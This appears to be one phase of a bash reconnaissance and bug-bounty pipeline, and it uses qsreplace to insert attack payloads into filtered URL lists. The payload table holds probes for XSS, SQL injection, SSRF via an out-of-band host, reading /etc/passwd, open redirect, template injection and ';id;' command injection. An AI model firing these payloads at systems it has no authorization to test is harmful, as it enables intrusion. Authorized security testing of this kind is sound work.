#!/usr/bin/env bash
# Phase 12 — qsreplace payload-replacement utility wrapper.
#
# Reads gf-filtered URL lists from Phase 11 and writes payload-ready URLs.
# Caller specifies PAYLOAD (default "FUZZ") or runs per-pattern automatically.

PHASE="12-payload-replace"
. "$(dirname "$0")/_lib.sh"

require_target
OUTDIR=$(out_dir "$PHASE")
GF_DIR="$RECONFORGE_OUTPUT_DIR/$TARGET/$DATESTAMP/11-pattern-filter"

if [ ! -d "$GF_DIR" ]; then
    log ERR "no gf output dir; run 11-pattern-filter.sh first"
    exit 5
fi
if ! command -v qsreplace >/dev/null 2>&1; then
    log ERR "qsreplace not installed"
    exit 4
fi

# Per-pattern payload templates
declare -A PAYLOADS=(
    [xss]='"><script>alert(1)</script>'
    [sqli]="'"
    [ssrf]="${INTERACTSH_URL:-http://abc.oast.pro/}"
    [lfi]="/etc/passwd"
    [redirect]="https://example.evil/"
    [ssti]='{{7*7}}'
    [rce]=';id;'
)

for pattern in "${!PAYLOADS[@]}"; do
    src="$GF_DIR/gf-$pattern.txt"
    [ ! -s "$src" ] && continue
    out="$OUTDIR/$pattern-payloads.txt"
    cat "$src" | qsreplace "${PAYLOADS[$pattern]}" > "$out" 2>/dev/null || true
    log INFO "$pattern → $(wc -l < "$out") payload-ready URLs"
done

log INFO "Phase 12 done — feed these into Phase 13 (OOB) or Phases 15-17 (targeted attacks)"
